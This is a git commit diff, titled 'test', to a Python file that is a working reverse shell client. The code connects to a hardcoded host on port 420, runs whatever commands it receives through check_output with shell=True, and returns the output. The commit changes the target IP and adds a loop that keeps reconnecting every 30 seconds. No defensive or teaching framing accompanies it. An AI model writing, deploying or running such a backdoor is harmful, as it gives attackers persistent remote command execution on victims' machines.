898919f709e78069d920e255f6ba26b7699fe042
BrainFuzz-hub <failoni401@gmail.com>
2021-03-24 17:00:26 +0100

    test

--- code/temp.py
+++ code/temp.py
@@ -2,49 +2,61 @@ import socket as s
 from subprocess import check_output
 from time import sleep
 
-HOST = "25.46.215.107"
+HOST = "10.0.0.5"
 PORT = 420
 BUFFER = 1024
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
 
 client = s.socket(s.AF_INET, s.SOCK_STREAM)
-client.connect(ADDR)
+connect = lambda: client.connect(ADDR)
+
+
+def connector():
+    try:
+        connect()
+        recvMsg()
+    except ConnectionRefusedError:
+        sleep(30)
+        connector()
 
 
 def sendMsg(msg):
-	sendLength = str(len(msg)).encode("utf-8")
-	client.send(sendLength)
+    sendLength = str(len(msg)).encode("utf-8")
+    client.send(sendLength)
 
-	client.send(msg.encode(FORMAT))
-	recvMsg()
+    client.send(msg.encode(FORMAT))
+    recvMsg()
 
 
 def process(message):
-	ctype = message[0]
-	messageLst = message.split(" ")
+    ctype = message[0]
+    messageLst = message.split(" ")
 
-	if ctype == "p":
-		check_output(messageLst, shell=True).decode(FORMAT)
-		recvMsg()
-	elif ctype == "c":
-		messageLst.pop(0)
-		comm = check_output(messageLst, shell=True).decode(FORMAT)
-		sendMsg(comm)
+    if ctype == "p":
+        check_output(messageLst, shell=True).decode(FORMAT)
+        recvMsg()
+    elif ctype == "c":
+        messageLst.pop(0)
+        comm = check_output(messageLst, shell=True).decode(FORMAT)
+        sendMsg(comm)
 
-	elif ctype == "f":
-		pass
+    elif ctype == "f":
+        pass
 
-	else:
-		pass
+    else:
+        pass
 
 
 def recvMsg():
-	msgLen = int(client.recv(BUFFER).decode(FORMAT))
+    try:
+        msgLen = int(client.recv(BUFFER).decode(FORMAT))
 
-	if msgLen:
-		msg = client.recv(int(msgLen)).decode(FORMAT)
-		process(msg)
+        if msgLen:
+            msg = client.recv(int(msgLen)).decode(FORMAT)
+            process(msg)
+    except ConnectionResetError:
+        connector()
 
 
-recvMsg()
+connector()
